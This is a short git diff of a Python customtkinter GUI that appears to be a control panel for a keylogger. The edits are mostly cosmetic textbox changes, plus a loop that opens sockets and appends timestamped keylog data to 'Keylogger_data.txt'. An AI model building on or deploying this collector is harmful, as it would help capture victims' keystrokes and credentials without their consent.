@@ -67,7 +67,11 @@ class App(customtkinter.CTk):
 
 
          # Text Box 
-        self.textbox = customtkinter.CTkTextbox(master=self.frame, width=160, height=500,corner_radius=0)
+        self.textbox = customtkinter.CTkTextbox(master=self.frame, 
+                                                width=160, 
+                                                height=500,
+                                                activate_scrollbars = False,
+                                                corner_radius=0)
         self.textbox.grid(row=0, column=2)
         
         # create CTk scrollbar
@@ -137,7 +141,7 @@ class App(customtkinter.CTk):
         self.frame2.grid(row=0, column=2, sticky="s")
         
         # BIG_Textbox, big_textbox, big
-        self.m_textbox = customtkinter.CTkTextbox(self.frame2, width=565, height=400,corner_radius=0)
+        self.m_textbox = customtkinter.CTkTextbox(self.frame2, width=565, height=400,corner_radius=0,)
         self.m_textbox.grid(row=1, column=1, sticky="n")
 
         self.entry = customtkinter.CTkEntry(master=self.frame2,
@@ -211,7 +215,7 @@ class App(customtkinter.CTk):
             PORT = self.keylog_SOPORT 
             global k_file
             with open("Keylogger_data.txt", "a") as k_file: # Create the Keylogger_data.txt file
-                k_file.write(f"\nLOG: {str(datetime.now())}")
+                k_file.write(f"LOG: {str(datetime.now())}\n") # Insert the current time and date to the text file
                 while True:
                     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                         self.SERVER_SOCKETS.append(s)
